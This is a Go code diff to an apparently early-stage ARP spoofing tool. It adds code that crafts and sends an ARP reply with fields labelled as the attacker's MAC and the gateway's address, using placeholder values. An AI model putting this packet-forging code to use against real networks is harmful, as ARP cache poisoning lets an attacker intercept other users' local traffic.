@@ -1,6 +1,7 @@
 package captureArp
 
 import (
+	"log"
 	"net"
 
 	"github.com/google/gopacket"
@@ -26,9 +27,9 @@ func craft_arp(attackerMac []byte, targeMac []byte, getwayIp []byte, targetIp []
 		ProtAddressSize:   4,
 		Operation:         op,
 		SourceHwAddress:   net.HardwareAddr(attackerMac), // Attacker mac
-		SourceProtAddress: net.IPv4(getwayIp[0], getwayIp[1], getwayIp[2], getwayIp[3]), // default getway
+		SourceProtAddress: getwayIp[:4],
 		DstHwAddress:      net.HardwareAddr(targeMac), // target
-		DstProtAddress:    net.IPv4(targetIp[0], targetIp[1], targetIp[2], targetIp[3]),
+		DstProtAddress:    targetIp[:4],
 	}
 	return arp
 }
@@ -50,11 +51,23 @@ func getTargetMac(targetIp []byte){
 func Packet(handler *pcap.Handle) {
 
     mac := net.HardwareAddr{0xFF, 0xAA, 0xFA, 0xAA, 0xFF, 0xAA};
-    ip := net.IP{192,168,0,2};
+	ip := []byte{192, 168, 0, 2}
     buffer := gopacket.NewSerializeBuffer();
-
     eth := craft_ethernet(mac,mac);
-    arp := craft_arp(mac, mac, mac, mac, layer);
-	gopacket.SerializableLayer(buffer, option, &layers.Ethernet{}, &layers.ARP{})
+    arp := craft_arp(mac, mac, ip, ip, layers.ARPReply);
+	opt := gopacket.SerializeOptions{
+		FixLengths: true,
+		ComputeChecksums: true,
+	}
+	err := gopacket.SerializeLayers(buffer, opt, eth,arp);
+	if err != nil {
+		log.Fatal("Error serilize the packet ", err);
+	}
+	err = handler.WritePacketData(buffer.Bytes());
+	if err != nil {
+		log.Fatal("Error serilize the packet ", err);
+	}
     
+	log.Printf("Everything goes as expected packet has been sent \n" );
+	log.Println(ip[:4] );
 }
